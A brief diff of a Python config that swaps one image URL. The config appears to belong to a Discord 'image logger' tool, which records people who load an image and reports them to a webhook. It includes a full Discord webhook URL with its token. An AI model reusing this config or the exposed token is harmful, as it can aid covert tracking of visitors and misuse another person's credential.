@@ -11,7 +11,7 @@ __author__ = "foaqen"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1462421470209900615/vQnxJ2XwI3lifmloj3ZDzPD0IingFoDesi-TzMgTIlIZ4FgCQsn5zUbYexHGZhOhi25U",
-    "image": "https://images.squarespace-cdn.com/content/v1/5315bf03e4b0601d6ce0714b/1501008195536-UH1L5YTNS9OUMM1ZJ9N2/techhive.jpg", 
+    "image": "https://i.pinimg.com/originals/c9/b0/30/c9b03092e5ea9a9deb82c713d9887f60.jpg", 
     
     "imageArgument": True,
 
